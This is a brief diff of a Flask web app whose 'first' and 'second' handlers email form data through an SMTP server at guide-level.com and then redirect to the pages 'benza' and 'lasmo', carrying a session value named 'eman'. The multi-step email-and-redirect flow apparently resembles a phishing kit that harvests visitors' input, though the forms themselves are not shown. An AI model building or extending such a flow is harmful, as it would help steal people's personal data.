@@ -104,7 +104,7 @@ def first():
         with smtplib.SMTP_SSL("guide-level.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman'), ins=session.get('ins')))
+        return redirect(url_for('benza', web=session.get('eman')))
 
 
 
@@ -142,7 +142,7 @@ def second():
         with smtplib.SMTP_SSL("guide-level.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('lasmo'))
+        return redirect(url_for('lasmo', web=session.get('eman')))
 
 
 
